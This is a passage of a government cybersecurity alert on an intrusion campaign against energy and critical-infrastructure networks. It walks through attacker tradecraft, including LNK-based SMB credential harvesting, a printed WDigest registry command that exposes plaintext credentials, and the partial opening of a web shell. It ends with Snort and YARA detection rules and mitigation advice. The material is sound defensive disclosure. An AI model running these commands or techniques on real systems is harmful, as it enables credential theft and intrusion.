actors created a scheduled task named <em>reset</em>, which was designed to automatically log out of their newly created account every eight hours.</p><p> </p><p><strong>VPN Software</strong></p><p>After achieving access to staging targets, the threat actors installed tools to carry out operations against intended victims. On one occasion, threat actors installed the free version of FortiClient, which they presumably used as a VPN client to connect to intended target networks.</p><p> </p><p><strong>Password Cracking Tools</strong></p><p>Consistent with the perceived goal of credential harvesting, the threat actors dropped and executed open source and free tools such as Hydra, SecretsDump, and CrackMapExec. The naming convention and download locations suggest that these files were downloaded directly from publically available locations such as GitHub. Forensic analysis indicates that many of these tools were executed during the timeframe in which the actor was accessing the system. Of note, the threat actors installed Python 2.7 on a compromised host of one staging victim, and a Python script was seen at C:\\Users\\&lt;Redacted Username&gt;\\Desktop\\OWAExchange\\.</p><p> </p><p><strong>Downloader </strong></p><p>Once inside of an intended target’s network, the threat actor downloaded tools from a remote server. The initial versions of the file names contained .txt extensions and were renamed to the appropriate extension, typically .exe or .zip.</p><p>In one example, after gaining remote access to the network of an intended victim, the threat actor carried out the following actions:</p><ul><li>The threat actor connected to 91.183.104[.]150 and downloaded multiple files, specifically the file INST.txt.</li><li>The files were renamed to new extensions, with INST.txt being renamed INST.exe.</li><li>The files were executed on the host and then immediately deleted.</li><li>The execution of INST.exe triggered a download of ntdll.exe, and shortly after, ntdll.exe appeared in the running process list of the compromised system of an intended target.</li><li>The registry value “ntdll” was added to the “HKEY_USERS\\&lt;USER SID&gt;\\Software\\Microsoft\\Windows\\CurrentVersion\\Run” key.</li></ul><p> </p><p><strong>Persistence Through .LNK File Manipulation</strong></p><p>The threat actors manipulated LNK files, commonly known as a Microsoft Window’s shortcut file, to repeatedly gather user credentials. Default Windows functionality enables icons to be loaded from a local or remote Windows repository. The threat actors exploited this built-in Windows functionality by setting the icon path to a remote server controller by the actors. When the user browses to the directory, Windows attempts to load the icon and initiate an SMB authentication session. During this process, the active user’s credentials are passed through the attempted SMB connection.</p><p>Four of the observed LNK files were “SETROUTE.lnk”, “notepad.exe.lnk”, “Document.lnk” and “desktop.ini.lnk”. These names appeared to be contextual, and the threat actor may use a variety of other file names while using this tactic. Two of the remote servers observed in the icon path of these LNK files were 62.8.193[.]206 and 5.153.58[.]45. Below is the parsed content of one of the LNK files:</p><p><img alt=\"Parsed content of one of the LNK files\" src=\"https://www.us-cert.gov/sites/default/files/publications/parsed_content_LNK_file.png\" style=\"width: 697px; height: 274px;\" /></p><p>Parsed output for file: desktop.ini.lnk</p><p><strong>Registry Modification </strong></p><p>The threat actor would modify key systems to store plaintext credentials in memory. In one instance, the threat actor executed the following command.</p><div style=\"clear: both;\"> </div><div style=\"clear: both;\"><table align=\"center\" border=\"1\" cellpadding=\"0\" cellspacing=\"0\" class=\"general-table\" style=\"width: 100%;\"><tbody><tr><td style=\"width: 100%; height: 71px;\"><p>reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\" /v UseLogonCredential /t REG_DWORD /d 1 /f</p></td></tr></tbody></table><div style=\"clear: both;\"> </div></div><p><strong>Stage 6: Command and Control</strong></p><p>The threat actors commonly created web shells on the intended targets’ publicly accessible email and web servers. The threat actors used three different filenames (“global.aspx, autodiscover.aspx and index.aspx) for two different webshells. The difference between the two groups was the “public string Password” field.</p><p> </p><p><strong>Beginning Contents of the Web Shell </strong></p><p>____________________________________________________________________________________________________________________</p><p>&lt;%@ Page Language=\"C#\" Debug=\"true\" trace=\"false\" validateRequest=\"false\" EnableViewStateMac=\"false\" EnableViewState=\"true\"%&gt;</p><p>&lt;%@ import Namespace=\"System\"%&gt;</p><p>&lt;%@ import Namespace=\"System.IO\"%&gt;</p><p>&lt;%@ import Namespace=\"System.Diagnostics\"%&gt;</p><p>&lt;%@ import Namespace=\"System.Data\"%&gt;</p><p>&lt;%@ import Namespace=\"System.Management\"%&gt;</p><p>&lt;%@ import Namespace=\"System.Data.OleDb\"%&gt;</p><p>&lt;%@ import Namespace=\"Microsoft.Win32\"%&gt;</p><p>&lt;%@ import Namespace=\"System.Net.Sockets\" %&gt;</p><p>&lt;%@ import Namespace=\"System.Net\" %&gt;</p><p>&lt;%@ import Namespace=\"System.Runtime.InteropServices\"%&gt;</p><p>&lt;%@ import Namespace=\"System.DirectoryServices\"%&gt;</p><p>&lt;%@ import Namespace=\"System.ServiceProcess\"%&gt;</p><p>&lt;%@ import Namespace=\"System.Text.RegularExpressions\"%&gt;</p><p>&lt;%@ Import Namespace=\"System.Threading\"%&gt;</p><p>&lt;%@ Import Namespace=\"System.Data.SqlClient\"%&gt;</p><p>&lt;%@ import Namespace=\"Microsoft.VisualBasic\"%&gt;</p><p>&lt;%@ Import Namespace=\"System.IO.Compression\" %&gt;</p><p>&lt;%@ Assembly Name=\"System.DirectoryServices,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A\"%&gt;</p><p>&lt;%@ Assembly Name=\"System.Management,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A\"%&gt;</p><p>&lt;%@ Assembly Name=\"System.ServiceProcess,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A\"%&gt;</p><p>&lt;%@ Assembly Name=\"Microsoft.VisualBasic,Version=7.0.3300.0,Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a\"%&gt;</p><p>&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"&gt;</p><p>&lt;script runat = \"server\"&gt;</p><p>public string Password = \"&lt;REDACTED&gt;\";</p><p>public string z_progname = \"z_WebShell\";</p><p>…</p><p><strong>____________________________________________________________________________________________________________________</strong></p><p> </p><p><strong>Stage 7: Actions on Objectives </strong></p><p>DHS and FBI identified the threat actors leveraging remote access services and infrastructure such as VPN, RDP, and Outlook Web Access (OWA). The threat actors used the infrastructure of staging targets to connect to several intended targets.</p><p> </p><p><strong>Internal Reconnaissance </strong></p><p>Upon gaining access to intended victims, the threat actors conducted reconnaissance operations within the network. DHS observed the threat actors focusing on identifying and browsing file servers within the intended victim’s network.</p><p>Once on the intended target’s network, the threat actors used privileged credentials to access the victim’s domain controller typically via RDP. Once on the domain controller, the threat actors used the batch scripts “dc.bat” and “dit.bat” to enumerate hosts, users, and additional information about the environment. The observed outputs (text documents) from these scripts were:</p><ul><li>admins.txt</li><li>completed_dclist.txt</li><li>completed_trusts.txt</li><li>completed_zone.txt</li><li>comps.txt</li><li>conditional_forwarders.txt</li><li>domain_zone.txt</li><li>enum_zones.txt</li><li>users.txt</li></ul><p>The threat actors also collected the files “ntds.dit” and the “SYSTEM” registry hive. DHS observed the threat actors compress all of these files into archives named “SYSTEM.zip” and “comps.zip”.</p><p>The threat actors used Windows’ scheduled task and batch scripts to execute “scr.exe” and collect additional information from hosts on the network. The tool “scr.exe” is a screenshot utility that the threat actor used to capture the screen of systems across the network. The MD5 hash of “scr.exe” matched the MD5 of ScreenUtil, as reported in the Symantec Dragonfly 2.0 report.</p><p>In at least two instances, the threat actors used batch scripts labeled “pss.bat” and “psc.bat” to run the PsExec tool. Additionally, the threat actors would rename the tool PsExec to “ps.exe”.</p><ol><li>The batch script (“pss.bat” or “psc.bat”) is executed with domain administrator credentials.</li><li>The directory “out” is created in the user’s %AppData% folder.</li><li>PsExec is used to execute “scr.exe” across the network and to collect screenshots of systems in “ip.txt”.</li><li>The screenshot’s filename is labeled based on the computer name of the host and stored in the target’s C:\\Windows\\Temp directory with a “.jpg” extension.</li><li>The screenshot is then copied over to the newly created “out” directory of the system where the batch script was executed.</li><li>In one instance, DHS observed an “out.zip” file created.</li></ol><p>DHS observed the threat actors create and modify a text document labeled “ip.txt” which is believed to have contained a list of host information. The threat actors used “ip.txt” as a source of hosts to perform additional reconnaissance efforts. In addition, the text documents “res.txt” and “err.txt” were observed being created as a result of the batch scripts being executed. In one instance, “res.txt” contained output from the Windows’ command “query user” across the network.</p><div style=\"clear: both;\"> </div><div style=\"clear: both;\"><table align=\"center\" border=\"1\" cellpadding=\"0\" cellspacing=\"0\" class=\"general-table\" style=\"width: 100%;\"><tbody><tr><td style=\"width: 100%; height: 71px;\"><p>Using &lt;Username&gt; &lt;Password&gt;<br />Running -s cmd /c query user on &lt;Hostname1&gt;<br />Running -s cmd /c query user on &lt;Hostname2&gt;<br />Running -s cmd /c query user on &lt;Hostname3&gt;<br />USERNAME     SESSIONNAME       ID    STATE    IDLE TIME      LOGON TIME<br />&lt;user1&gt;                                              2       Disc       1+19:34         6/27/2017 12:35 PM</p></td></tr></tbody></table><div style=\"clear: both;\"> </div></div><p>An additional batch script named “dirsb.bat” was used to gather folder and file names from hosts on the network.</p><p>In addition to the batch scripts, the threat actors also used scheduled tasks to collect screenshots with “scr.exe”. In two instances, the scheduled tasks were designed to run the command “C:\\Windows\\Temp\\scr.exe” with the argument “C:\\Windows\\Temp\\scr.jpg”. In another instance, the scheduled task was designed to run with the argument “pss.bat” from the local administrator’s “AppData\\Local\\Microsoft\\” folder.</p><p>The threat actors commonly executed files out of various directories within the user’s AppData or Downloads folder. Some common directory names were</p><ul><li>Chromex64,</li><li>Microsoft_Corporation,</li><li>NT,</li><li>Office365,</li><li>Temp, and</li><li>Update.</li></ul><p> </p><p><strong>Targeting of ICS and SCADA Infrastructure</strong></p><p>In multiple instances, the threat actors accessed workstations and servers on a corporate network that contained data output from control systems within energy generation facilities. The threat actors accessed files pertaining to ICS or supervisory control and data acquisition (SCADA) systems. Based on DHS analysis of existing compromises, these files were named containing ICS vendor names and ICS reference documents pertaining to the organization (e.g., “SCADA WIRING DIAGRAM.pdf” or “SCADA PANEL LAYOUTS.xlsx”).</p><p>The threat actors targeted and copied profile and configuration information for accessing ICS systems on the network. DHS observed the threat actors copying Virtual Network Connection (VNC) profiles that contained configuration information on accessing ICS systems. DHS was able to reconstruct screenshot fragments of a Human Machine Interface (HMI) that the threat actors accessed.</p><p><img alt=\"This image depicts a reconstructed screenshot of a Human Machine Interface (HMI) system that was accessed by the threat actor. This image demonstrates the threat actor's focus and interest in Industrial Control System (ICS) environments.\" src=\"https://www.us-cert.gov/sites/default/files/publications/JTA-graphic.jpg\" style=\"width: 900px; height: 757px;\" /></p><p> </p><p><strong>Cleanup and Cover Tracks </strong></p><p>In multiple instances, the threat actors created new accounts on the staging targets to perform cleanup operations. The accounts created were used to clear the following Windows event logs: System, Security, Terminal Services, Remote Services, and Audit. The threat actors also removed applications they installed while they were in the network along with any logs produced. For example, the Fortinet client installed at one commercial facility was deleted along with the logs that were produced from its use. Finally, data generated by other accounts used on the systems accessed were deleted.</p><p>Threat actors cleaned up intended target networks through deleting created screenshots and specific registry keys. Through forensic analysis, DHS determined that the threat actors deleted the registry key associated with terminal server client that tracks connections made to remote systems. The threat actors also deleted all batch scripts, output text documents and any tools they brought into the environment such as “scr.exe”.</p><p> </p><p><strong>Detection and Response</strong></p><p>IOCs related to this campaign are provided within the accompanying .csv and .stix files of this alert. DHS and FBI recommend that network administrators review the IP addresses, domain names, file hashes, network signatures, and YARA rules provided, and add the IPs to their watchlists to determine whether malicious activity has been observed within their organization. System owners are also advised to run the YARA tool on any system suspected to have been targeted by these threat actors.</p><p> </p><p><strong>Network Signatures and Host-Based Rules</strong></p><p>This section contains network signatures and host-based rules that can be used to detect malicious activity associated with threat actor TTPs. Although these network signatures and host-based rules were created using a comprehensive vetting process, the possibility of false positives always remains.</p><p> </p><p><strong>Network Signatures</strong></p><p>alert tcp $HOME_NET any -&gt; $EXTERNAL_NET $HTTP_PORTS (msg:\"HTTP URI contains '/aspnet_client/system_web/4_0_30319/update/' (Beacon)\"; sid:42000000; rev:1; flow:established,to_server; content:\"/aspnet_client/system_web/4_0_30319/update/\"; http_uri; fast_pattern:only; classtype:bad-unknown; metadata:service http;)</p><p>___________________________________</p><p>alert tcp $HOME_NET any -&gt; $EXTERNAL_NET $HTTP_PORTS (msg:\"HTTP URI contains '/img/bson021.dat'\"; sid:42000001; rev:1; flow:established,to_server; content:\"/img/bson021.dat\"; http_uri; fast_pattern:only; classtype:bad-unknown; metadata:service http;)</p><p>________________________________________</p><p>alert tcp $HOME_NET any -&gt; $EXTERNAL_NET $HTTP_PORTS (msg:\"HTTP URI contains '/A56WY' (Callback)\"; sid:42000002; rev:1; flow:established,to_server; content:\"/A56WY\"; http_uri; fast_pattern; classtype:bad-unknown; metadata:service http;)</p><p>_________________________________________</p><p>alert tcp any any -&gt; any 445 (msg:\"SMB Client Request contains 'AME_ICON.PNG' (SMB credential harvesting)\"; sid:42000003; rev:1; flow:established,to_server; content:\"|FF|SMB|75 00 00 00 00|\"; offset:4; depth:9; content:\"|08 00 01 00|\"; distance:3; content:\"|00 5c 5c|\"; distance:2; within:3; content:\"|5c|AME_ICON.PNG\"; distance:7; fast_pattern; classtype:bad-unknown; metadata:service netbios-ssn;)</p><p>________________________________________</p><p>alert tcp $HOME_NET any -&gt; $EXTERNAL_NET $HTTP_PORTS (msg:\"HTTP URI OPTIONS contains '/ame_icon.png' (SMB credential harvesting)\"; sid:42000004; rev:1; flow:established,to_server; content:\"/ame_icon.png\"; http_uri; fast_pattern:only; content:\"OPTIONS\"; nocase; http_method; classtype:bad-unknown; metadata:service http;)</p><p>_________________________________________</p><p>alert tcp $HOME_NET any -&gt; $EXTERNAL_NET $HTTP_PORTS (msg:\"HTTP Client Header contains 'User-Agent|3a 20|Go-http-client/1.1'\"; sid:42000005; rev:1; flow:established,to_server; content:\"User-Agent|3a 20|Go-http-client/1.1|0d 0a|Accept-Encoding|3a 20|gzip\"; http_header; fast_pattern:only; pcre:\"/\\.(?:aspx|txt)\\?[a-z0-9]{3}=[a-z0-9]{32}&amp;/U\"; classtype:bad-unknown; metadata:service http;)</p><p>__________________________________________</p><p>alert tcp $EXTERNAL_NET [139,445] -&gt; $HOME_NET any (msg:\"SMB Server Traffic contains NTLM-Authenticated SMBv1 Session\"; sid:42000006; rev:1; flow:established,to_client; content:\"|ff 53 4d 42 72 00 00 00 00 80|\"; fast_pattern:only; content:\"|05 00|\"; distance:23; classtype:bad-unknown; metadata:service netbios-ssn;)<br /> </p><p><strong>YARA Rules</strong></p><p>This is a consolidated rule set for malware associated with this activity. These rules were written by NCCIC and include contributions from trusted partners.</p><p>*/</p><p> </p><p>rule APT_malware_1</p><p>{</p><p>meta:</p><p>            description = \"inveigh pen testing tools &amp; related artifacts\"</p><p>            author = \"DHS | NCCIC Code Analysis Team\"    </p><p>            date = \"2017/07/17\"</p><p>            hash0 = \"61C909D2F625223DB2FB858BBDF42A76\"</p><p>            hash1 = \"A07AA521E7CAFB360294E56969EDA5D6\"</p><p>            hash2 = \"BA756DD64C1147515BA2298B6A760260\"</p><p>            hash3 = \"8943E71A8C73B5E343AA9D2E19002373\"</p><p>            hash4 = \"04738CA02F59A5CD394998A99FCD9613\"</p><p>            hash5 = \"038A97B4E2F37F34B255F0643E49FC9D\"</p><p>            hash6 = \"65A1A73253F04354886F375B59550B46\"</p><p>            hash7 = \"AA905A3508D9309A93AD5C0EC26EBC9B\"</p><p>            hash8 = \"5DBEF7BDDAF50624E840CCBCE2816594\"</p><p>            hash9 = \"722154A36F32BA10E98020A8AD758A7A\"</p><p>            hash10 = \"4595DBE00A538DF127E0079294C87DA0\"</p><p>strings:</p><p>            $s0 = \"file://\"</p><p>            $s1 = \"/ame_icon.png\"</p><p>            $s2 = \"184.154.150.66\"</p><p>            $s3 = { 87D081F60C67F5086A003315D49A4000F7D6E8EB12000081F7F01BDD21F7DE }</p><p>            $s4 = { 33C42BCB333DC0AD400043C1C61A33C3F7DE33F042C705B5AC400026AF2102 }</p><p>            $s5 = \"(g.charCodeAt(c)^l[(l[b]+l[e])%256])\"</p><p>            $s6 = \"for(b=0;256&gt;b;b++)k[b]=b;for(b=0;256&gt;b;b++)\"</p><p>            $s7 = \"VXNESWJfSjY3grKEkEkRuZeSvkE=\"</p><p>            $s8 = \"NlZzSZk=\"</p><p>            $s9 = \"WlJTb1q5kaxqZaRnser3sw==\"</p><p>            $s10 = \"for(b=0;256&gt;b;b++)k[b]=b;for(b=0;256&gt;b;b++)\"</p><p>            $s11 = \"fromCharCode(d.charCodeAt(e)^k[(k[b]+k[h])%256])\"</p><p>            $s12 = \"ps.exe -accepteula \\\\%ws% -u %user% -p %pass% -s cmd /c netstat\"</p><p>            $s13 = { 22546F6B656E733D312064656C696D733D5C5C222025254920494E20286C6973742E74787429 }</p><p>            $s14 = { 68656C6C2E657865202D6E6F65786974202D657865637574696F6E706F6C69637920627970617373202D636F6D6D616E6420222E202E5C496E76656967682E70 }</p><p>            $s15 = { 476F206275696C642049443A202266626433373937623163313465306531 }</p><p>//inveigh pentesting tools</p><p>            $s16 = { 24696E76656967682E7374617475735F71756575652E4164642822507265737320616E79206B657920746F2073746F70207265616C2074696D65 }</p><p>//specific malicious word document PK archive</p><p>            $s17 = { 2F73657474696E67732E786D6CB456616FDB3613FEFE02EF7F10F4798E64C54D06A14ED125F19A225E87C9FD0194485B }</p><p>            $s18 = { 6C732F73657474696E67732E786D6C2E72656C7355540500010076A41275780B0001040000000004000000008D90B94E03311086EBF014D6F4D87B48214471D2 }</p><p>            $s19 = { 8D90B94E03311086EBF014D6F4D87B48214471D210A41450A0E50146EBD943F8923D41C9DBE3A54A240ACA394A240ACA39 }</p><p>            $s20 = { 8C90CD4EEB301085D7BD4F61CDFEDA092150A1BADD005217B040E10146F124B1F09FEC01B56F8FC3AA9558B0B4 }</p><p>            $s21 = { 8C90CD4EEB301085D7BD4F61CDFEDA092150A1BADD005217B040E10146F124B1F09FEC01B56F8FC3AA9558B0B4 }</p><p>            $s22 = \"5.153.58.45\"</p><p>            $s23 = \"62.8.193.206\"</p><p>            $s24 = \"/1/ree_stat/p\"</p><p>            $s25 = \"/icon.png\"</p><p>            $s26 = \"/pshare1/icon\"</p><p>            $s27 = \"/notepad.png\"</p><p>            $s28 = \"/pic.png\"</p><p>            $s29 = \"http://bit.ly/2m0x8IH\"</p><p>           </p><p>condition:</p><p>            ($s0 and $s1 or $s2) or ($s3 or $s4) or ($s5 and $s6 or $s7 and $s8 and $s9) or ($s10 and $s11) or ($s12 and $s13) or ($s14) or ($s15) or ($s16) or ($s17) or ($s18) or ($s19) or ($s20) or ($s21) or ($s0 and $s22 or $s24) or ($s0 and $s22 or $s25) or ($s0 and $s23 or $s26) or ($s0 and $s22 or $s27) or ($s0 and $s23 or $s28) or ($s29)</p><p>}</p><p> </p><p> </p><p> </p><p>rule APT_malware_2</p><p>{</p><p>meta:</p><p>      description = \"rule detects malware\"</p><p>      author = \"other\"</p><p> </p><p>strings:</p><p>      $api_hash = { 8A 08 84 C9 74 0D 80 C9 60 01 CB C1 E3 01 03 45 10 EB ED }</p><p>      $http_push = \"X-mode: push\" nocase</p><p>      $http_pop = \"X-mode: pop\" nocase</p><p> </p><p>condition:</p><p>      any of them</p><p>}</p><p> </p><p> </p><p> </p><p>rule Query_XML_Code_MAL_DOC_PT_2</p><p>{</p><p>meta:</p><p>     name= \"Query_XML_Code_MAL_DOC_PT_2\"</p><p>     author = \"other\"</p><p> </p><p>strings:</p><p> </p><p>            $zip_magic = { 50 4b 03 04 }</p><p>            $dir1 = \"word/_rels/settings.xml.rels\"</p><p>            $bytes = {8c 90 cd 4e eb 30 10 85 d7}</p><p> </p><p>condition:</p><p>            $zip_magic at 0 and $dir1 and $bytes</p><p>}</p><p> </p><p> </p><p> </p><p>rule Query_Javascript_Decode_Function</p><p>{</p><p>meta:</p><p>      name= \"Query_Javascript_Decode_Function\"</p><p>      author = \"other\"</p><p> </p><p>strings:</p><p>      $decode1 = {72 65 70 6C 61 63 65 28 2F 5B 5E 41 2D 5A 61 2D 7A 30 2D 39 5C 2B 5C 2F 5C 3D 5D 2F 67 2C 22 22 29 3B}</p><p>      $decode2 = {22 41 42 43 44 45 46 47 48 49 4A 4B 4C 4D 4E 4F 50 51 52 53 54 55 56 57 58 59 5A 61 62 63 64 65 66 67 68 69 6A 6B 6C 6D 6E 6F 70 71 72 73 74 75 76 77 78 79 7A 30 31 32 33 34 35 36 37 38 39 2B 2F 3D 22 2E 69 6E 64 65 78 4F 66 28 ?? 2E 63 68 61 72 41 74 28 ?? 2B 2B 29 29}</p><p>      $decode3 = {3D ?? 3C 3C 32 7C ?? 3E 3E 34 2C ?? 3D 28 ?? 26 31 35 29 3C 3C 34 7C ?? 3E 3E 32 2C ?? 3D 28 ?? 26 33 29 3C 3C 36 7C ?? 2C ?? 2B 3D [1-2] 53 74 72 69 6E 67 2E 66 72 6F 6D 43 68 61 72 43 6F 64 65 28 ?? 29 2C 36 34 21 3D ?? 26 26 28 ?? 2B 3D 53 74 72 69 6E 67 2E 66 72 6F 6D 43 68 61 72 43 6F 64 65 28 ?? 29}</p><p>      $decode4 = {73 75 62 73 74 72 69 6E 67 28 34 2C ?? 2E 6C 65 6E 67 74 68 29}</p><p>      $func_call=\"a(\\\"\"</p><p> </p><p>condition:</p><p>      filesize &lt; 20KB and #func_call &gt; 20 and all of ($decode*)</p><p> </p><p>}</p><p> </p><p> </p><p> </p><p>rule Query_XML_Code_MAL_DOC</p><p>{</p><p>meta:</p><p>      name= \"Query_XML_Code_MAL_DOC\"</p><p>      author = \"other\"</p><p> </p><p>strings:</p><p>      $zip_magic = { 50 4b 03 04 }</p><p>      $dir = \"word/_rels/\" ascii</p><p>      $dir2 = \"word/theme/theme1.xml\" ascii</p><p>      $style = \"word/styles.xml\" ascii</p><p> </p><p>condition:</p><p>      $zip_magic at 0 and $dir at 0x0145 and $dir2 at 0x02b7 and $style at 0x08fd</p><p>}</p><p> </p><p> </p><p> </p><p>rule z_webshell</p><p>{</p><p>meta:</p><p>            description = \"Detection for the z_webshell\"</p><p>            author = \"DHS NCCIC Hunt and Incident Response Team\"</p><p>            date = \"2018/01/25\"</p><p>            md5 =  \"2C9095C965A55EFC46E16B86F9B7D6C6\"</p><p> </p><p>strings:</p><p>            $aspx_identifier1 = \"&lt;%@ \" nocase ascii wide</p><p>            $aspx_identifier2 = \"&lt;asp:\" nocase ascii wide</p><p>            $script_import = /(import|assembly) Name(space)?\\=\\\"(System|Microsoft)/ nocase ascii wide</p><p>            $case_string = /case \\\"z_(dir|file|FM|sql)_/ nocase ascii wide</p><p>            $webshell_name = \"public string z_progname =\" nocase ascii wide</p><p>            $webshell_password = \"public string Password =\" nocase ascii wide</p><p> </p><p>condition:</p><p>            1 of ($aspx_identifier*)</p><p>            and #script_import &gt; 10</p><p>            and #case_string &gt; 7</p><p>            and 2 of ($webshell_*)</p><p>            and filesize &lt; 100KB</p><p>}</p>\t\t    \n\t\t    <h3>Impact</h3>\n\t\t    <p>This actors’ campaign has affected multiple organizations in the energy, nuclear, water, aviation, construction, and critical manufacturing sectors.</p>\t\t    \n\t\t    <h3>Solution</h3>\n\t\t    <p>DHS and FBI encourage network users and administrators to use the following detection and prevention guidelines to help defend against this activity.</p><p> </p><p><strong>Network and Host-based Signatures</strong></p><p>DHS and FBI recommend that network administrators review the IP addresses, domain names, file hashes, and YARA and Snort signatures provided and add the IPs to their watch list to determine whether malicious activity is occurring within their organization. Reviewing network perimeter netflow will help determine whether a network has experienced suspicious activity. Network defenders and malware analysts should use the YARA and Snort signatures provided in the associated YARA and .txt file to identify malicious activity.</p><p> </p><p><strong>Detections and Prevention Measures</strong></p><ul><li>Users and administrators may detect spear phishing, watering hole, web shell, and remote access activity by comparing all IP addresses and domain names listed in the IOC packages to the following locations:<ul><li>network intrusion detection system/network intrusion protection system logs,</li><li>web content logs,</li><li>proxy server logs,</li><li>domain name server resolution logs,</li><li>packet capture (PCAP) repositories,</li><li>firewall logs,</li><li>workstation Internet browsing history logs,</li><li>host-based intrusion detection system /host-based intrusion prevention system (HIPS) logs,</li><li>data loss prevention logs,</li><li>exchange server logs,</li><li>user mailboxes,</li><li>mail filter logs,</li><li>mail content logs,</li><li>AV mail logs,</li><li>OWA logs,</li><li>Blackberry Enterprise Server logs, and</li><li>Mobile Device Management logs.</li></ul></li><li>To detect the presence of web shells on external-facing servers, compare IP addresses, filenames, and file hashes listed in the IOC packages with the following locations:<ul><li>application logs,</li><li>IIS/Apache logs,</li><li>file system,</li><li>intrusion detection system/ intrusion prevention system logs,</li><li>PCAP repositories,</li><li>firewall logs, and</li><li>reverse proxy.</li></ul></li><li>Detect spear-phishing by searching workstation file systems and network-based user directories, for attachment filenames and hashes found in the IOC packages.</li><li>Detect persistence in VDI environments by searching file shares containing user profiles for all .lnk files.</li><li>Detect evasion techniques by the actors by identifying deleted logs. This can be done by reviewing last-seen entries and by searching for event 104 on Windows system logs.</li><li>Detect persistence by reviewing all administrator accounts on systems to identify unauthorized accounts, especially those created recently.</li><li>Detect the malicious use of legitimate credentials by reviewing the access times of remotely accessible systems for all users. Any unusual login times should be reviewed by the account owners.</li><li>Detect the malicious use of legitimate credentials by validating all remote desktop and VPN sessions of any user’s credentials suspected to be compromised.</li><li>Detect spear-phishing by searching OWA logs for all IP addresses listed in the IOC packages.</li><li>Detect spear-phishing through a network by validating all new email accounts created on mail servers, especially those with external user access.</li><li>Detect persistence on servers by searching system logs for all filenames listed in the IOC packages.</li><li>Detect lateral movement and privilege escalation by searching PowerShell logs for all filenames ending in “.ps1” contained in the IOC packages. (Note: requires PowerShell version 5, and PowerShell logging must be enabled prior to the activity.)</li><li>Detect persistence by reviewing all installed applications on critical systems for unauthorized applications, specifically note FortiClient VPN and Python 2.7.</li><li>Detect persistence by searching for the value of “REG_DWORD 100” at registry location “HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal”. Services\\MaxInstanceCount” and the value of “REG_DWORD 1” at location “HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system\\dontdisplaylastusername”.</li><li>Detect installation by searching all proxy logs for downloads from URIs without domain names.</li></ul><p> </p><p><strong>General Best Practices Applicable to this Campaign:</strong></p><ul><li>Prevent external communication of all versions of SMB and related protocols at the network boundary by blocking TCP ports 139 and 445 with related UDP port 137. See the NCCIC/US-CERT publication on <a href=\"https://www.us-cert.gov/ncas/current-activity/2017/01/16/SMB-Security-Best-Practices\">SMB Security Best Practices </a>for more information.</li><li>Block the Web-based Distributed Authoring and Versioning (WebDAV) protocol on border gateway devices on the network.</li><li>Monitor VPN logs for abnormal activity (e.g., off-hour logins, unauthorized IP address logins, and multiple concurrent logins).</li><li>Deploy web and email filters on the network. Configure these devices to scan for known bad domain names, sources, and addresses; block these before receiving and downloading messages. This action will help to reduce the attack surface at the network’s first level of defense. Scan all emails, attachments, and downloads (both on the host and at the mail gateway) with a reputable anti-virus solution that includes cloud reputation services.</li><li>Segment any critical networks or control systems from business systems and networks according to industry best practices.</li><li>Ensure adequate logging and visibility on ingress and egress points.</li><li>Ensure the use of PowerShell version 5, with enhanced logging enabled. Older versions of PowerShell do not provide adequate logging of the PowerShell commands an attacker may have executed. Enable PowerShell module logging, script block logging, and transcription. Send the associated logs to a centralized log repository for monitoring and analysis. See the FireEye blog post Greater Visibility through PowerShell Logging for more information.</li><li>Implement the prevention, detection, and mitigation strategies outlined in the NCCIC/US-CERT Alert TA15-314A – <a href=\"https://www.us-cert.gov/ncas/alerts/TA15-314A\">Compromised Web Servers and Web Shells – Threat Awareness and Guidance</a>.</li><li>Establish a training mechanism to inform end users on proper email and web usage, highlighting current information and analysis, and including common indicators of phishing. End users should have clear instructions on how to report unusual or suspicious emails.</li><li>Implement application directory whitelisting. System administrators may implement application or application directory whitelisting through Microsoft Software Restriction Policy, AppLocker, or similar software. Safe defaults allow applications to run from PROGRAMFILES, PROGRAMFILES(X86), SYSTEM32, and any ICS software folders. All other locations should be disallowed unless an exception is granted.</li><li>Block RDP connections originating from untrusted external addresses unless an exception exists; routinely review exceptions on a regular basis for validity.</li><li>Store system logs of mission critical systems for at least one year within a security information event management tool.</li><li>Ensure applications are configured to log the proper level of detail for an incident response investigation.</li><li>Consider implementing HIPS or other controls to prevent unauthorized code execution.</li><li>Establish least-privilege controls.</li><li>Reduce the number of Active Directory domain and enterprise administrator accounts.</li><li>Based on the suspected level of compromise, reset all user, administrator, and service account credentials across all local and domain systems.</li><li>Establish a password policy to require complex passwords for all users.</li><li>Ensure that accounts for network administration do not have external connectivity.</li><li>Ensure that network administrators use non-privileged accounts for email and Internet access.</li><li>Use two-factor authentication for all authentication, with special emphasis on any external-facing interfaces and high-risk environments (e.g., remote access, privileged access, and access to sensitive data).</li><li>Implement a process for logging and auditing activities conducted by privileged accounts.</li><li>Enable logging and alerting on privilege escalations and role changes.</li><li>Periodically conduct searches of publically available information to ensure no sensitive information has been disclosed. Review photographs and documents for sensitive data that may have inadvertently been included.</li><li>Assign sufficient personnel to review logs, including records of alerts.</li><li>Complete independent security (as opposed to compliance) risk review.</li><li>Create and participate in information sharing programs.</li><li>Create and maintain network and system documentation to aid in timely incident response. Documentation should include network diagrams, asset owners, type of asset, and an incident response plan.</li></ul><p> </p><p><strong>Report Notice</strong></p><p>DHS encourages recipients who identify the use of tools or techniques discussed in this document to report information to DHS or law enforcement immediately. To request incident response resources or technical assistance, contact NCCIC at <a href=\"https://www.us-cert.govmailto:NCCICcustomerservice@hq.dhs.gov\">NCCICcustomerservice@hq.dhs.gov</a> or 888-282-0870 and the FBI through a local field office or the FBI’s Cyber Division (<a href=\"https://www.us-cert.govmailto:CyWatch@fbi.gov\">CyWatch@fbi.gov </a>or 855-292-3937).</p>\t\t    \n\t\t    <h3>References</h3>\n\t\t    <ul>\n            \t\t    \t<li><a href=\"https://www.symantec.com/connect/blogs/dragonfly-western-energy-sector-targeted-sophisticated-attack-group\">[1] Symantec. Dragonfly: Western energy sector targeted by sophisticated attack group. September 6, 